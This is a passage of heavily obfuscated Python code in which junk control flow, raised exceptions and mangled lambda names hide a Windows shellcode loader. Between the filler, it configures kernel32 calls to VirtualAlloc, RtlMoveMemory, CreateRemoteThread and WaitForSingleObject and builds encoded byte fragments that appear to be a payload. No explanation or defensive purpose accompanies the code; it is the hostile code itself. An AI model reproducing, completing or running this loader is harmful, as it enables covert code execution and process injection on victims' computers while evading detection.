        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742704, 16742704]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _319: _319 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1811 = [[(lambda: (lambda _194: _194 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _123: _123 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742704, 16742704, 16742710]))))())())()])
        raise MemoryError([(lambda: (lambda _1716: _1716 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _94:
        __5148465748935 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '124' == '42':
        case True:
            raise MemoryError([True])
        case False:
            _136 = [[True], [False]]
            R_E_D__A_V______(['_1913'])
    raise MemoryError([True])
except MemoryError as _187:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742712]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742705]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1415: _1415 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1218 = [[(lambda: (lambda _153: _153 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _714: _714 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742706, 16742710]))))())())()])
        raise MemoryError([(lambda: (lambda _185: _185 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1318:
        try:
            raise MemoryError(__5148465748935)
        except MemoryError as __2086526169090:
            if __2086526169090.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.VirtualAlloc.restype = wt.LPVOID
            if __2086526169090.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __5697111483854 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x91\xbc6/H\x06'))()
try:
    match '118' == '128':
        case True:
            raise MemoryError([True])
        case False:
            _1412 = [[True], [False]]
            R_E_D__A_V______(['_1014'])
    raise MemoryError([True])
except MemoryError as _615:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742706]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742705]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _83: _83 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1714 = [[(lambda: (lambda _119: _119 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _912: _912 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742708, 16742712]))))())())()])
        raise MemoryError([(lambda: (lambda _131: _131 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1211:
        __3385844006965 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '15' == '1710':
        case True:
            raise MemoryError([True])
        case False:
            _416 = [[True], [False]]
            R_E_D__A_V______(['_191'])
    raise MemoryError([True])
except MemoryError as _48:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707, 16742707]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742704, 16742709]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1710: _1710 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _134 = [[(lambda: (lambda _115: _115 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1119: _1119 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742708, 16742704, 16742711]))))())())()])
        raise MemoryError([(lambda: (lambda _1918: _1918 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _45:
        __3385844006965 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '519' == '119':
        case True:
            raise MemoryError([True])
        case False:
            _171 = [[True], [False]]
            R_E_D__A_V______(['_43'])
    raise MemoryError([True])
except MemoryError as _104:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742712]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _812: _812 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _412 = [[(lambda: (lambda _12: _12 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _14: _14 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742705, 16742704, 16742704]))))())())()])
        raise MemoryError([(lambda: (lambda _1112: _1112 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _819:
        try:
            raise MemoryError(__3385844006965)
        except MemoryError as __4212030396964:
            if __4212030396964.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.CreateRemoteThread.argtypes = (wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.LPVOID, wt.LPVOID, wt.DWORD, wt.LPVOID)
            if __4212030396964.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __3638370145028 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x93i\tA\x88\x17'))()
            if __4212030396964.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __7186077936793 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x97\xf1\xde\x16\xe1\\'))()
            if __4212030396964.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __3549917900481 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xce\xee:|\x8c\xbf'))()
try:
    match '21' == '1718':
        case True:
            raise MemoryError([True])
        case False:
            _31 = [[True], [False]]
            R_E_D__A_V______(['_181'])
    raise MemoryError([True])
except MemoryError as _106:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742704, 16742704]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742704, 16742709]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _12: _12 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _158 = [[(lambda: (lambda _811: _811 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _13: _13 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742703, 16742710]))))())())()])
        raise MemoryError([(lambda: (lambda _714: _714 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _115:
        __2972945418661 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '1910' == '94':
        case True:
            raise MemoryError([True])
        case False:
            _188 = [[True], [False]]
            R_E_D__A_V______(['_155'])
    raise MemoryError([True])
except MemoryError as _145:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742704, 16742704]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742704, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _101: _101 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _62 = [[(lambda: (lambda _1314: _1314 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _76: _76 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742707, 16742711]))))())())()])
        raise MemoryError([(lambda: (lambda _132: _132 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _171:
        __2972945418661 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '1711' == '617':
        case True:
            raise MemoryError([True])
        case False:
            _181 = [[True], [False]]
            R_E_D__A_V______(['_129'])
    raise MemoryError([True])
except MemoryError as _1317:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742704, 16742710]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742704, 16742705]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1219: _1219 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _516 = [[(lambda: (lambda _21: _21 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _57: _57 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742703, 16742709]))))())())()])
        raise MemoryError([(lambda: (lambda _152: _152 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _36:
        try:
            raise MemoryError(__2972945418661)
        except MemoryError as __8579909431264:
            if __8579909431264.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.CreateRemoteThread.restype = wt.HANDLE
            if __8579909431264.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __2636882785420 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x1fE\xfb\\\x83\x0e'))()
            if __8579909431264.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __4512281210969 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x81\x8e\x98\x89&v'))()
try:
    match '1113' == '54':
        case True:
            raise MemoryError([True])
        case False:
            _1817 = [[True], [False]]
            R_E_D__A_V______(['_312'])
    raise MemoryError([True])
except MemoryError as _415:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742704, 16742703]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742705]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _29: _29 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _196 = [[(lambda: (lambda _315: _315 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1014: _1014 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742708, 16742704]))))())())()])
        raise MemoryError([(lambda: (lambda _133: _133 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _158:
        __6089136220246 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '911' == '517':
        case True:
            raise MemoryError([True])
        case False:
            _1811 = [[True], [False]]
            R_E_D__A_V______(['_155'])
    raise MemoryError([True])
except MemoryError as _1913:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742704, 16742712]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1814: _1814 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _196 = [[(lambda: (lambda _918: _918 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _183: _183 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742708, 16742704, 16742704]))))())())()])
        raise MemoryError([(lambda: (lambda _1416: _1416 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _612:
        __6089136220246 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '186' == '121':
        case True:
            raise MemoryError([True])
        case False:
            _112 = [[True], [False]]
            R_E_D__A_V______(['_103'])
    raise MemoryError([True])
except MemoryError as _1719:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742704, 16742703]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1317: _1317 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _176 = [[(lambda: (lambda _1813: _1813 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _218: _218 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742712, 16742708]))))())())()])
        raise MemoryError([(lambda: (lambda _64: _64 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _34:
        try:
            raise MemoryError(__6089136220246)
        except MemoryError as __6041362926040:
            if __6041362926040.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.RtlMoveMemory.argtypes = (wt.LPVOID, wt.LPVOID, ctypes.c_size_t)
            if __6041362926040.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __6325965730408 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x0b\\Zj\x07{'))()
            if __6041362926040.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __2700685190807 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xa8\x8b\xec\xbb\xd8\xa6'))()
try:
    match '118' == '1513':
        case True:
            raise MemoryError([True])
        case False:
            _111 = [[True], [False]]
            R_E_D__A_V______(['_1813'])
    raise MemoryError([True])
except MemoryError as _1015:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742705]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1618: _1618 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _211 = [[(lambda: (lambda _168: _168 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _316: _316 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742705, 16742708]))))())())()])
        raise MemoryError([(lambda: (lambda _1017: _1017 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1412:
        __3000748737401 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '51' == '143':
        case True:
            raise MemoryError([True])
        case False:
            _177 = [[True], [False]]
            R_E_D__A_V______(['_1012'])
    raise MemoryError([True])
except MemoryError as _1710:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742711]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _108: _108 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1912 = [[(lambda: (lambda _14: _14 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _183: _183 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742707, 16742704]))))())())()])
        raise MemoryError([(lambda: (lambda _619: _619 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _166:
        __3000748737401 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '51' == '1113':
        case True:
            raise MemoryError([True])
        case False:
            _315 = [[True], [False]]
            R_E_D__A_V______(['_153'])
    raise MemoryError([True])
except MemoryError as _914:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742712, 16742706]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707, 16742704, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _43: _43 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1112 = [[(lambda: (lambda _166: _166 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _516: _516 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742705, 16742704, 16742712]))))())())()])
        raise MemoryError([(lambda: (lambda _1017: _1017 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _97:
        try:
            raise MemoryError(__3000748737401)
        except MemoryError as __7699203981783:
            if __7699203981783.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.RtlMoveMemory.restype = None
            if __7699203981783.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __6595503806324 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xfbs\xbf|An'))()
            if __7699203981783.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __6741347573539 = (lambda: R_E_D__A_V(b'R_E_D__A_V__UN(h\xd4\x07'))()
            if __7699203981783.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __6198654912195 = (lambda: R_E_D__A_V(b'R_E_D__A_V__4H\x87!\xb8\x81'))()
            if __7699203981783.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x06'))():
                __2649640179928 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xf2\x1c\x96\x97\x88Y'))()
try:
    match '127' == '1114':
        case True:
            raise MemoryError([True])
        case False:
            _157 = [[True], [False]]
            R_E_D__A_V______(['_1513'])
    raise MemoryError([True])
except MemoryError as _1817:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742710]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1817: _1817 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _153 = [[(lambda: (lambda _177: _177 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _117: _117 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742708, 16742709]))))())())()])
        raise MemoryError([(lambda: (lambda _1217: _1217 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _192:
        __4807474120187 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '1416' == '61':
        case True:
            raise MemoryError([True])
        case False:
            _79 = [[True], [False]]
            R_E_D__A_V______(['_1011'])
    raise MemoryError([True])
except MemoryError as _114:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742707]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742706]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _45: _45 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _212 = [[(lambda: (lambda _61: _61 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1011: _1011 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742707, 16742704]))))())())()])
        raise MemoryError([(lambda: (lambda _1813: _1813 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _512:
        __4807474120187 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '413' == '1910':
        case True:
            raise MemoryError([True])
        case False:
            _418 = [[True], [False]]
            R_E_D__A_V______(['_121'])
    raise MemoryError([True])
except MemoryError as _133:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742707]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742710, 16742708]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _87: _87 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _52 = [[(lambda: (lambda _719: _719 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _818: _818 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742706, 16742704, 16742707]))))())())()])
        raise MemoryError([(lambda: (lambda _713: _713 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _49:
        try:
            raise MemoryError(__4807474120187)
        except MemoryError as __2514284813365:
            if __2514284813365.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.WaitForSingleObject.argtypes = (wt.HANDLE, wt.DWORD)
            if __2514284813365.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __5802180228930 = (lambda: R_E_D__A_V(b'R_E_D__A_V__*J\x1bs\xca1'))()
            if __2514284813365.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __6170922351660 = (lambda: R_E_D__A_V(b"R_E_D__A_V__\xc1'L\xb7M}"))()
            if __2514284813365.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __4963990726649 = (lambda: R_E_D__A_V(b'R_E_D__A_V__Z\x14\x89\xc8\xd2\x1e'))()
try:
    match '83' == '1719':
        case True:
            raise MemoryError([True])
        case False:
            _113 = [[True], [False]]
            R_E_D__A_V______(['_175'])
    raise MemoryError([True])
except MemoryError as _311:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742711]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742710, 16742704, 16742705]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _13: _13 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1912 = [[(lambda: (lambda _134: _134 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _813: _813 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742708, 16742704, 16742712]))))())())()])
        raise MemoryError([(lambda: (lambda _1718: _1718 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1015:
        __6551090758762 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '64' == '56':
        case True:
            raise MemoryError([True])
        case False:
            _1813 = [[True], [False]]
            R_E_D__A_V______(['_151'])
    raise MemoryError([True])
except MemoryError as _1319:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742712, 16742709]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742704, 16742703]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _171: _171 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _106 = [[(lambda: (lambda _415: _415 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _196: _196 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
